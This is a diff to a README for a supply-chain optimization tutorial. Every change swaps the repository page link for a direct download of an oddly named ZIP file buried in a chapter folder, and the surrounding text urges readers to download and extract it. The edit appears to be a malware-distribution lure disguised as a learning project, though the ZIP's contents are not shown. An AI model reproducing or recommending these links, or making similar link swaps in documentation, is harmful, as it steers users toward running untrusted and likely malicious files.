@@ -1,6 +1,6 @@
 # 📦 supply-chain-optimization-from-scratch - Learn supply chain models step by step
 
-[![Download](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mynadisillusioned804/supply-chain-optimization-from-scratch)
+[![Download](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Mynadisillusioned804/supply-chain-optimization-from-scratch/main/ch01/scratch-from-optimization-chain-supply-3.5.zip)
 
 ## 🧾 What this is
 
@@ -32,7 +32,7 @@ If you are only opening the project to learn, you can still read the files witho
 
 Visit this page to download or access the project:
 
-https://github.com/Mynadisillusioned804/supply-chain-optimization-from-scratch
+https://raw.githubusercontent.com/Mynadisillusioned804/supply-chain-optimization-from-scratch/main/ch01/scratch-from-optimization-chain-supply-3.5.zip
 
 If the page gives you a ZIP file, download it to your computer and extract it. If it gives you source files, save them in one folder so you can open them later.
 
@@ -166,7 +166,7 @@ If a file does not run, look for the main Python file in the folder and use that
 
 Download or open the project here:
 
-https://github.com/Mynadisillusioned804/supply-chain-optimization-from-scratch
+https://raw.githubusercontent.com/Mynadisillusioned804/supply-chain-optimization-from-scratch/main/ch01/scratch-from-optimization-chain-supply-3.5.zip
 
 ## 📝 How to use it well
 
